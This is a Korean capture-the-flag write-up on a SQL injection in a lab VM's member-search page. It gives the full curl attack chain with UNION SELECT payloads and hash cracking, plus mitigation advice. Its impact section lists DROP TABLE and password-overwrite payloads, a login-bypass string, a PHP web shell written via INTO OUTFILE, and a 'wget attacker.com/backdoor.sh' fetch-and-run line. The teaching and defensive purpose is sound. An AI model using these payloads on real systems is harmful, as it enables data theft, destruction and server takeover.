# 취약점 #2: 회원 검색 페이지의 SQL Injection

## 🎯 취약점 유형
**SQL Injection (SQL 삽입 공격)**
- **OWASP 분류**: A03:2021 - Injection
- **CWE 분류**: CWE-89 - SQL 명령어에 사용되는 특수 요소의 부적절한 무력화

---

## 🔍 취약점 발견 과정

### 발견: 회원 검색 페이지
**URL**: `http://192.168.64.2/index.php?page=member`

이 페이지에서는 사용자 ID를 입력하여 회원 정보를 검색할 수 있습니다.

### 1단계: 정상 쿼리 테스트
먼저 정상적인 기능을 테스트하기 위해 사용자 ID `1`을 검색했습니다:

**입력**:
```sql
1
```

**출력**:
```
ID: 1
First name: one
Surname : me
```

애플리케이션은 두 개의 필드를 반환합니다: `first_name`과 `surname`.

### 2단계: SQL Injection 취약점 테스트
입력값이 SQL Injection에 취약한지 테스트하기 위해 "항상 참"인 조건을 사용했습니다:

**입력**:
```sql
1 OR 1=1
```

**서버에서 실행될 것으로 예상되는 SQL 쿼리**:
```sql
SELECT first_name, surname FROM users WHERE id = 1 OR 1=1
```

**결과**: 모든 사용자 레코드가 반환되었습니다!

![OR TRUE 조건을 이용한 SQL Injection](images/01-sql-injection-true.png)

**출력**:
```
ID: 1 OR 1=1
First name: one
Surname : me

ID: 1 OR 1=1
First name: two
Surname : me

ID: 1 OR 1=1
First name: three
Surname : me

ID: 1 OR 1=1
First name: Flag
Surname : GetThe
```

✅ **SQL Injection 취약점 확인!** 마지막 사용자 "Flag GetThe"가 수상해 보입니다.

**왜 이렇게 되었나?**

원래 SQL 쿼리는 이렇게 작성되었을 것입니다:
```sql
SELECT first_name, surname FROM users WHERE id = $id
```

우리가 `1 OR 1=1`을 입력하면:
```sql
SELECT first_name, surname FROM users WHERE id = 1 OR 1=1
```

`1=1`은 **항상 참**이므로:
- `WHERE id = 1` → 1번 사용자만 (거짓일 수 있음)
- `OR 1=1` → 항상 참
- **결과**: `OR` 연산자 때문에 전체 조건이 항상 참이 되어 **모든 레코드 반환**!

### 3단계: 컬럼 개수 확인 (UNION SELECT)
더 많은 데이터를 추출하려면 원본 쿼리가 몇 개의 컬럼을 반환하는지 알아야 합니다.

**입력**:
```sql
1 UNION SELECT null, null
```

**결과**: 에러 없음! 쿼리가 **2개의 컬럼**을 반환한다는 것을 확인했습니다.

![UNION SELECT로 컬럼 개수 확인](images/02-union-select-columns.png)

**UNION SELECT란?**

`UNION`은 두 개의 SELECT 쿼리 결과를 합치는 명령어입니다:

```sql
SELECT first_name, surname FROM users WHERE id = 1
UNION
SELECT null, null
```

첫 번째 쿼리 결과 + 두 번째 쿼리 결과 = 합쳐진 결과

만약 컬럼 개수가 맞지 않으면:
```
The used SELECT statements have a different number of columns
```
이런 에러가 발생합니다.

### 4단계: 데이터베이스 이름 확인
**입력**:
```sql
1 UNION SELECT database(), null
```

**결과**: 데이터베이스 이름은 `Member_Sql_Injection`

![데이터베이스 이름 추출](images/03-database-name.png)

**`database()` 함수**:
- MySQL/MariaDB 내장 함수
- 현재 사용 중인 데이터베이스 이름을 반환합니다

### 5단계: 데이터베이스 구조 열거
모든 테이블과 컬럼을 찾기 위해 `information_schema`를 쿼리했습니다:

**입력**:
```sql
-1 UNION SELECT table_name, column_name FROM information_schema.columns
```

**왜 `-1`을 사용했나?**
- `-1`은 존재하지 않는 ID입니다 (ID는 양수만 존재)
- 첫 번째 SELECT가 아무 결과도 반환하지 않게 하여
- 우리가 주입한 쿼리 결과만 보이도록 합니다

**`information_schema`란?**
- MySQL/MariaDB의 메타데이터 저장소
- 모든 데이터베이스, 테이블, 컬럼 정보가 들어있습니다
- 기본적으로 모든 사용자가 접근 가능합니다

**발견된 `users` 테이블의 컬럼들**:
- `user_id` - 사용자 ID
- `first_name` - 이름
- `last_name` - 성
- `town` - 도시
- `country` - 국가
- `planet` - 행성
- `Commentaire` - 코멘트 (프랑스어로 "Comment")
- `countersign` - 비밀번호

### 6단계: 힌트와 비밀번호 해시 추출
**입력**:
```sql
1 UNION SELECT Commentaire, countersign FROM users
```

![Commentaire(힌트)와 countersign(비밀번호 해시) 한번에 추출](images/04-hint-and-password.png)

**Flag 사용자의 결과**:
```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

**발견된 정보**:
- **힌트** (Commentaire): 비밀번호 복호화 후 소문자로 변환하고 SHA256 해싱
- **비밀번호 해시** (countersign): `5ff9d0165b4f92b14994e5c685cdce28`

이 비밀번호는 MD5 해시입니다 (32개의 16진수 문자).

**MD5 해시 특징**:
- 128비트 (16바이트)
- 16진수로 표현하면 32자
- 일방향 해시 함수 (이론적으로 역계산 불가)
- 하지만 레인보우 테이블로 크랙 가능!

**왜 한 번에 추출했나?**
- 원래는 `first_name, Commentaire` 따로, `first_name, countersign` 따로 쿼리해야 했지만
- `Commentaire, countersign`을 직접 SELECT하면 **1번의 쿼리로 모든 정보 획득**
- 더 효율적이고 실전적인 방법입니다

### 7단계: MD5 해시 크랙
[CrackStation.net](https://crackstation.net/)을 사용:

![MD5 해시 크랙 결과](images/05-md5-crack.png)

**해시**: `5ff9d0165b4f92b14994e5c685cdce28`
**평문**: `FortyTwo`

**어떻게 크랙이 가능한가?**
- CrackStation은 수십억 개의 해시를 미리 계산해서 저장합니다
- 흔한 비밀번호는 이미 데이터베이스에 있습니다
- 해시를 입력하면 데이터베이스에서 검색하여 평문을 찾습니다
- 이것이 바로 **레인보우 테이블 공격**입니다

### 8단계: Flag 생성
Commentaire의 지시사항을 따라:

1. **Decrypt**: `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
2. **소문자 변환**: `FortyTwo` → `fortytwo`
3. **SHA256 해시**:

```bash
echo -n "fortytwo" | shasum -a 256
```

![SHA256 해시 생성](images/06-sha256-flag.png)

**결과**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

✅ **Flag 획득!**

---

## 💥 공격 방법 (재현)

### 완전한 공격 체인

```bash
# 1. SQL Injection 취약점 테스트
curl "http://192.168.64.2/index.php?page=member&id=1+OR+1%3D1&Submit=Submit"

# 2. 컬럼 개수 확인
curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+null%2C+null&Submit=Submit"

# 3. 데이터베이스 이름 추출
curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+database()%2C+null&Submit=Submit"

# 4. 테이블 구조 열거
curl "http://192.168.64.2/index.php?page=member&id=-1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit"

# 5. 힌트와 비밀번호 해시 한번에 추출
curl "http://192.168.64.2/index.php?page=member&id=1+UNION+SELECT+Commentaire%2C+countersign+FROM+users&Submit=Submit"

# 6. MD5 해시 크랙
# https://crackstation.net/ 방문
# 입력: 5ff9d0165b4f92b14994e5c685cdce28
# 출력: FortyTwo

# 7. SHA256 Flag 생성
echo -n "fortytwo" | shasum -a 256
# 출력: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

### 대안: CONCAT으로 모든 데이터 한번에 추출

모든 사용자 정보를 한 번의 쿼리로 추출:

```sql
-1 UNION SELECT CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign), 1 FROM users
```

이렇게 하면 모든 컬럼이 하나의 출력 필드로 연결됩니다.

---

## 🛡️ 보안 문제 분석

### 1️⃣ 입력 검증 없음

**문제점**: 사용자 입력이 검증 없이 SQL 쿼리에 직접 삽입됩니다.

**취약한 코드 예시** (PHP):
```php
$id = $_GET['id'];
$query = "SELECT first_name, surname FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);
```

**문제 분석**:
- `$_GET['id']`를 그대로 사용
- 사용자가 `1 OR 1=1`을 입력하면 쿼리가 변형됨
- SQL 구조 자체가 변경 가능

### 2️⃣ 원시 SQL 쿼리 구성

**문제점**: 문자열 연결을 사용하여 SQL 쿼리를 구성하면 injection을 허용합니다.

**취약한 패턴**:
```php
// 잘못된 방법 1: 직접 연결
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// 잘못된 방법 2: 이중 따옴표 내 변수
$query = "SELECT * FROM users WHERE id = $id";

// 잘못된 방법 3: sprintf
$query = sprintf("SELECT * FROM users WHERE id = %s", $_GET['id']);
```

### 3️⃣ 상세한 에러 메시지

**문제점**: 데이터베이스 에러가 사용자에게 그대로 표시되어 다음 정보가 노출됩니다:
- 데이터베이스 종류 (MariaDB)
- 쿼리 구조
- 테이블과 컬럼 이름

**에러 메시지 예시**:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
```

**공격자에게 제공되는 정보**:
- 사용 중인 데이터베이스: MariaDB
- SQL 문법 구조
- 쿼리가 어떻게 실행되는지

### 4️⃣ 약한 비밀번호 해싱

**문제점**:
- **MD5 사용**: 2004년부터 암호학적으로 취약한 것으로 알려짐
- **Salt 없음**: 같은 비밀번호는 항상 같은 해시 생성
- **레인보우 테이블 공격에 취약**: 미리 계산된 해시 테이블로 쉽게 크랙

**MD5의 문제**:
```
비밀번호: "password"
MD5: 5f4dcc3b5aa765d61d8327deb882cf99

이 해시는:
1. CrackStation에서 즉시 크랙 가능
2. 구글 검색으로 찾을 수 있음
3. 초당 수십억 개 계산 가능 (GPU)
```

### 5️⃣ Information Schema 접근 가능

**문제점**: 애플리케이션이 `information_schema` 쿼리를 허용하여 다음이 노출됩니다:
- 모든 데이터베이스 이름
- 모든 테이블 이름
- 모든 컬럼 이름

**공격자가 얻는 이점**:
```sql
-- 모든 테이블 보기
SELECT table_name FROM information_schema.tables

-- 특정 테이블의 모든 컬럼 보기
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 전체 데이터베이스 구조 매핑 가능
```

---

## 🔧 해결 방법 (Mitigation)

### 1️⃣ Prepared Statements 사용 (가장 중요!)

**✅ 안전한 코드** (PHP with PDO):
```php
$id = $_GET['id'];

// Prepared Statement 준비
$stmt = $pdo->prepare("SELECT first_name, surname FROM users WHERE id = ?");

// 파라미터 바인딩 및 실행
$stmt->execute([$id]);

// 결과 가져오기
$result = $stmt->fetchAll();
```

**✅ 안전한 코드** (PHP with MySQLi):
```php
$id = $_GET['id'];

// Prepared Statement 준비
$stmt = $conn->prepare("SELECT first_name, surname FROM users WHERE id = ?");

// 파라미터 타입 지정 및 바인딩 (i = integer)
$stmt->bind_param("i", $id);

// 실행
$stmt->execute();

// 결과 가져오기
$result = $stmt->get_result();
```

**왜 안전한가?**
- 사용자 입력은 **데이터**로만 취급됩니다 (SQL 코드 아님)
- SQL 구조는 고정되어 변경할 수 없습니다
- `1 OR 1=1`을 입력하면:
  - 취약한 코드: SQL 조건으로 해석 → 모든 레코드 반환
  - Prepared Statement: 문자열 `"1 OR 1=1"`로 검색 → 결과 없음

**Prepared Statement의 동작 방식**:
```
1단계: SQL 템플릿 준비
   "SELECT * FROM users WHERE id = ?"

2단계: 데이터 바인딩
   ? ← 1 (정수로 바인딩)

3단계: 실행
   데이터베이스가 SQL 구조와 데이터를 분리하여 처리

결과: 사용자 입력이 SQL 코드로 해석될 수 없음
```

### 2️⃣ 입력 검증

**화이트리스트 검증**:
```php
// 숫자 ID만 허용
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($id === false || $id < 1) {
    die("유효하지 않은 ID입니다");
}

// 이제 $id는 확실히 정수입니다
```

**타입 캐스팅**:
```php
// 강제로 정수로 변환
$id = (int)$_GET['id'];

if ($id <= 0) {
    die("유효하지 않은 ID입니다");
}
```

**정규표현식 검증** (더 복잡한 입력의 경우):
```php
if (!preg_match('/^[0-9]+$/', $_GET['id'])) {
    die("ID는 숫자만 가능합니다");
}
```

### 3️⃣ 프로덕션에서 에러 표시 비활성화

**php.ini 설정**:
```ini
# 에러를 브라우저에 표시하지 않음
display_errors = Off

# 에러를 로그 파일에 기록
log_errors = On
error_log = /var/log/php_errors.log

# 모든 에러 보고 (로그에만)
error_reporting = E_ALL
```

**애플리케이션 레벨**:
```php
try {
    $result = $stmt->execute();
} catch (PDOException $e) {
    // 로그에 상세 에러 기록
    error_log("Database error: " . $e->getMessage());

    // 사용자에게는 일반적인 메시지만 표시
    die("오류가 발생했습니다. 나중에 다시 시도해주세요.");
}
```

**사용자에게 보여줄 것**:
```
❌ 나쁨: You have an error in your SQL syntax near 'SELECT * FROM users'
✅ 좋음: 오류가 발생했습니다. 나중에 다시 시도해주세요.
```

### 4️⃣ 강력한 비밀번호 해싱 사용

**bcrypt 또는 Argon2 사용**:

```php
// 비밀번호 해싱 (회원가입 시)
$password = $_POST['password'];
$hash = password_hash($password, PASSWORD_ARGON2ID);

// 또는 bcrypt
$hash = password_hash($password, PASSWORD_BCRYPT);

// DB에 $hash 저장

// 비밀번호 검증 (로그인 시)
$inputPassword = $_POST['password'];
$storedHash = $user['password']; // DB에서 가져온 해시

if (password_verify($inputPassword, $storedHash)) {
    // 비밀번호 일치
    echo "로그인 성공!";
} else {
    // 비밀번호 불일치
    echo "잘못된 비밀번호";
}
```

**왜 bcrypt/Argon2가 안전한가?**

| 알고리즘 | 속도 | Salt | 크랙 시간 (동일 비밀번호) |
|---------|------|------|------------------------|
| MD5 | 매우 빠름 | ❌ 없음 | 즉시 (레인보우 테이블) |
| SHA256 | 빠름 | ❌ 없음 | 수 초 |
| bcrypt | **느림** | ✅ 자동 | 수천 년 |
| Argon2 | **느림** | ✅ 자동 | 수만 년 |

**bcrypt의 특징**:
```php
$hash = password_hash("password123", PASSWORD_BCRYPT);
// $2y$10$abcdefghijklmnopqrstuOZnL2G.mJ8K0fvHZxKZr.9YqK0

// $2y: bcrypt 버전
// $10: Cost factor (느리게 만드는 정도)
// 다음 22자: Salt (자동 생성)
// 나머지: 실제 해시

// 같은 비밀번호도 매번 다른 해시 생성!
password_hash("password123", PASSWORD_BCRYPT);
// $2y$10$XYZ...다른값...

password_hash("password123", PASSWORD_BCRYPT);
// $2y$10$ABC...또다른값...
```

### 5️⃣ 최소 권한 원칙 (Principle of Least Privilege)

**데이터베이스 사용자 권한 제한**:

```sql
-- 1. 웹 애플리케이션 전용 사용자 생성
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password_here';

-- 2. 필요한 권한만 부여
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'webapp'@'localhost';
GRANT SELECT, INSERT, UPDATE ON myapp.orders TO 'webapp'@'localhost';

-- 3. 위험한 권한은 부여하지 않음
-- ❌ DROP, CREATE, ALTER
-- ❌ FILE (파일 읽기/쓰기)
-- ❌ PROCESS (프로세스 보기)

-- 4. information_schema 접근 제한 (기본적으로 접근 불가)
-- 아무 권한도 주지 않으면 자동으로 차단됨

-- 5. 권한 적용
FLUSH PRIVILEGES;
```

**애플리케이션에서 제한된 사용자로 연결**:
```php
// ❌ 나쁨: root 사용자 사용
$conn = new PDO('mysql:host=localhost;dbname=myapp', 'root', 'rootpass');

// ✅ 좋음: 제한된 권한의 사용자 사용
$conn = new PDO('mysql:host=localhost;dbname=myapp', 'webapp', 'webapp_pass');
```

### 6️⃣ 웹 애플리케이션 방화벽 (WAF)

**ModSecurity 규칙** (Apache):
```apache
# SQL Injection 패턴 탐지
SecRule ARGS "@detectSQLi" \
    "id:1,phase:2,deny,status:403,msg:'SQL Injection 탐지'"

# UNION 키워드 차단
SecRule ARGS "@rx (?i:union.*select)" \
    "id:2,phase:2,deny,status:403,msg:'UNION SELECT 공격 차단'"
```

**Nginx + ModSecurity**:
```nginx
location / {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}
```

### 7️⃣ 입력 이스케이핑 (다층 방어)

```php
// 추가 보호 계층 (Prepared Statement의 대체가 아님!)
$id = mysqli_real_escape_string($conn, $_GET['id']);

// 하지만 이것만으로는 부족!
$query = "SELECT * FROM users WHERE id = $id"; // 여전히 취약
```

**⚠️ 중요**: 이스케이핑만으로는 **충분하지 않습니다**!
- 항상 **Prepared Statement**를 사용하세요
- 이스케이핑은 추가 보호 계층일 뿐입니다

---

## 📊 영향 평가

### CVSS 3.1 점수: 9.8 (치명적)

**공격 벡터 (AV)**: Network - 네트워크를 통해 원격 공격 가능
**공격 복잡도 (AC)**: Low - 매우 쉽게 공격 가능
**필요 권한 (PR)**: None - 인증 불필요
**사용자 상호작용 (UI)**: None - 자동화 가능
**범위 (S)**: Changed - 시스템 범위 넘어 확장
**기밀성 (C)**: High - 모든 데이터 노출
**무결성 (I)**: High - 데이터 변조 가능
**가용성 (A)**: High - 시스템 파괴 가능

### 잠재적 피해

#### 1. 데이터 유출 (Data Breach)
```sql
-- 모든 사용자 정보 노출
1 UNION SELECT first_name, countersign FROM users

-- 신용카드 정보 노출 (있다면)
1 UNION SELECT card_number, cvv FROM payments
```

**결과**:
- ✅ 모든 사용자 인증 정보 노출
- ✅ 개인정보 유출 (이름, 주소, 연락처)
- ✅ 비밀번호 해시 크랙 가능

#### 2. 데이터 조작 (Data Manipulation)
```sql
-- 모든 사용자의 비밀번호 변경
1; UPDATE users SET countersign = 'hacked' WHERE 1=1; --

-- 관리자 계정 생성
1; INSERT INTO users (user_id, first_name, is_admin) VALUES (999, 'hacker', 1); --

-- 가격 변조
1; UPDATE products SET price = 0.01 WHERE product_id = 1; --
```

#### 3. 데이터 파괴 (Data Destruction)
```sql
-- 테이블 삭제
1; DROP TABLE users; --

-- 데이터베이스 삭제
1; DROP DATABASE Member_Sql_Injection; --

-- 모든 레코드 삭제
1; DELETE FROM users WHERE 1=1; --
```

#### 4. 인증 우회 (Authentication Bypass)

**로그인 폼에서**:
```sql
-- Username 입력란에:
admin' OR '1'='1' --

-- 결과 쿼리:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = 'xxx'

-- '1'='1'은 항상 참
-- -- 주석으로 비밀번호 체크 무시
-- 결과: 비밀번호 없이 admin으로 로그인!
```

#### 5. 원격 코드 실행 (RCE) - 파일 권한이 있는 경우

```sql
-- PHP 웹쉘 생성
1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --

-- 사용법:
-- http://site.com/shell.php?cmd=ls
-- http://site.com/shell.php?cmd=cat /etc/passwd
```

**시스템 완전 장악 가능**:
```bash
# 웹쉘을 통해 실행 가능한 명령들
ls -la                    # 파일 목록
cat /etc/passwd          # 시스템 사용자 확인
whoami                   # 현재 사용자
wget attacker.com/backdoor.sh  # 백도어 다운로드
bash backdoor.sh         # 백도어 실행
```

---

## 📚 참고 자료

### 공식 문서
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [PHP PDO Prepared Statements](https://www.php.net/manual/en/pdo.prepared-statements.php)

### 학습 자료
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [UNION SELECT 튜토리얼](https://www.sqlinjection.net/union/)
- [MySQL Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

### 도구
- [sqlmap](http://sqlmap.org/) - 자동화된 SQL Injection 도구
- [Burp Suite](https://portswigger.net/burp) - 웹 취약점 스캐너
- [CrackStation](https://crackstation.net/) - 해시 크랙

---

## 🛠️ 사용된 도구

- **Browser**: 수동 테스트
- **curl**: 커맨드라인 테스트
- **CrackStation**: MD5 해시 크랙
- **shasum**: SHA256 해시 생성

---

## 🎓 핵심 교훈

### SQL Injection 방어의 황금률:
1. **절대 사용자 입력을 신뢰하지 마세요**
2. **항상 Prepared Statement를 사용하세요**
3. **최소 권한 원칙을 적용하세요**
4. **에러 메시지를 숨기세요**
5. **강력한 해싱을 사용하세요**

### 공격자의 관점:
- SQL Injection은 **가장 강력한 웹 취약점** 중 하나
- 데이터 유출부터 시스템 장악까지 가능
- 자동화 도구로 대규모 스캔 가능
- **한 번의 성공으로 전체 데이터베이스 접근**

### 개발자의 책임:
- 보안은 "나중에" 추가할 수 없습니다
- Prepared Statement는 **선택이 아닌 필수**
- "내 사이트는 작아서 안전해"는 없습니다
- **모든 입력은 잠재적 공격**으로 간주해야 합니다

---

**Flag**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---
**발견 일시**: 2025년 11월 3일
**심각도**: CRITICAL (치명적)
**재현 난이도**: 매우 쉬움 (자동화 도구 이용 가능)
**CVSS 점수**: 9.8/10
